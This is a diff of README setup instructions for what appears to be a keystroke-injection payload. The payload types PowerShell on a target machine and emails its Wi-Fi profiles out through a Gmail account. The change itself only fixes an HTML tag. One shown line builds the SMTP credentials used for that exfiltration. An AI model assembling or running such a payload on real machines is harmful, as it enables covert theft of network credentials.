@@ -13,7 +13,7 @@ For Senders Email go to line 101 or find this line
 
 <i><b> Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('CHANGE_THIS_GMAIL_ADDRESS@gmail.com', 'CHANGE_THIS_TO_EMAIL_PASSWORD')");</b></i> 
 
-Here you will need to change the text that says <b><i>CHANGE_THIS_GMAIL_ADDRESS@gmail.com</i><b/> to the gmail address the Wifi Profile is to be sent from.
+Here you will need to change the text that says <b><i>CHANGE_THIS_GMAIL_ADDRESS@gmail.com</i></b> to the gmail address the Wifi Profile is to be sent from.
 
 Then Change the text that says <i><b>CHANGE_THIS_TO_EMAIL_PASSWORD</b></i> to the corresponding password of the email address from above.
 
